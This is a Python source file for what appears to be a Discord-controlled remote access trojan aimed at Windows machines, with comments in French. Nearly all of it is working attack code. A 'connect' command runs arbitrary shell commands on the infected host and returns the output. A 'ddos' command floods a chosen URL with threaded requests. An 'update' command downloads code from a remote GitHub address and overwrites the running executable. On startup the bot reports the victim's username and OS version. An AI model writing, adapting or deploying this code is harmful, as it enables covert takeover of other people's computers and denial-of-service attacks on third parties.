import platform
import os
import subprocess
import discord
from discord.ext import commands
from cryptography.fernet import Fernet
import requests
import threading
import base64
from win32com.client import Dispatch
import sys
import shutil
import ssl
import tkinter.messagebox
import certifi
import requests
#test
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

user = os.getlogin()
current_directory = os.getcwd()
exe_path = os.path.abspath(sys.argv[0])
script_dir = os.path.dirname(exe_path)
path_exist = r"C:\Users\\"+user+"\WindowsManagement\\"

@bot.command()
async def ddos(ctx, *, user_input):
  listeMots = user_input.split()
  if listeMots[0] == "ddosHTTP":
      
    url = listeMots[1]
    nbrDdosHttpRequest = listeMots[2]

    # Fonction pour envoyer des requêtes
    async def send_request(url):
        try:      
            response = requests.get(url)
        except requests.exceptions.RequestException as e:
            pass

    # Lancer plusieurs threads pour envoyer des requêtes simultanement
    threads = []
    def start(url = "",nbrDdosHttpRequest=100):
        for i in range(nbrDdosHttpRequest):
            thread = threading.Thread(target=send_request,args=(url,))
            threads.append(thread)
            thread.start()
    start(url,int(nbrDdosHttpRequest))
    # Attendre que tous les threads se terminent
    for thread in threads:
        thread.join()
    

    await ctx.send("attaque termine")

@bot.command()
async def user(ctx):
    await ctx.send(f"{os.getlogin()}")

@bot.command()
async def message(ctx, *, user_input):
    tkinter.messagebox.showwarning(title="information", message=user_input)

@bot.command()
async def exit(ctx, *, user_input):
    listeMots = user_input.split()
    user = os.getlogin()
    try:
        if listeMots[0] == user or listeMots[0] == "all":
            await ctx.send(f"arret de {user}")
            await bot.close()
        try:
            if listeMots[0] == "all" and not listeMots[1] == "confirm":
                await ctx.send(f"pour confirmer l'arret de tout les bots veuillez ecrire !exit all confirm")
        except:
            pass
        if listeMots[0] == "all" and listeMots[1] == "confirm":
            await ctx.send(f"arret de tout les bots donc:    {user}")
            await bot.close()
    except SyntaxError as e:
        await ctx.send(f"erreur: {e}")
@bot.command()
async def update(ctx, *, user_input):
    plugin_addr = "https://github.com/2MathNosseb/plugin/raw/main/plugin.py"
    r = requests.get(plugin_addr)
    if user_input == "update":
        with open(exe_path, "w",encoding="utf-8",errors="replace") as f:
            f.write(r.text)
        f.close()
        await ctx.send(f"update confirmed")
    if user_input == "see":
        await ctx.send(plugin_addr)
        #await ctx.send(r.text)
@bot.command()
async def connect(ctx, *, user_input):
    global current_directory
    listeMots = user_input.split()
    user = os.getlogin()
    
    if listeMots[0] == user or listeMots[0] == "all":
        await ctx.send(f"Vous contrôlez actuellement {user}")
        listeMots = listeMots[1:] 
        Executecommand = " ".join(listeMots)
        
        if Executecommand.startswith("cd "):
            try:
                directory = Executecommand.split("cd ", 1)[1].strip()
                if os.path.exists(directory):
                    os.chdir(directory)
                    current_directory = os.getcwd()
                    await ctx.send(f"Repertoire change vers {current_directory}")
                else:
                    await ctx.send(f"Le repertoire {directory} n'existe pas.")
            except Exception as e:
                await ctx.send(f"Erreur lors du changement de repertoire : {str(e)}")
        else:
            if "pwd" in Executecommand:
                await ctx.send(f"{current_directory}")
            else:
                try:
                    # Utiliser un encodage adapte pour Windows (comme 'cp1252' ou 'mbcs')
                    output = subprocess.check_output(Executecommand, shell=True, stderr=subprocess.STDOUT, cwd=current_directory)
                    decoded_output = output.decode('cp1252').strip()  # Utiliser un encodage adapte ici
                    if decoded_output:
                        await ctx.send(f"{decoded_output}")
                    else:
                        await ctx.send("La commande n'a produit aucune sortie.")
                except subprocess.CalledProcessError as e:
                    await ctx.send(f"Erreur lors de l'execution de la commande: {e.output.decode('cp1252')}")
                except UnicodeDecodeError as e:
                    await ctx.send(f"Erreur de decodage: {str(e)}")
                    
@bot.event
async def on_ready():
    channel = discord.utils.get(bot.get_all_channels(), name='chat')  # Remplacez 'chat' par le nom de votre canal
    if channel:
        await channel.send("__***User connecte;***__")
        await channel.send(os.getlogin())
        await channel.send(platform.system())
        await channel.send(platform.version())
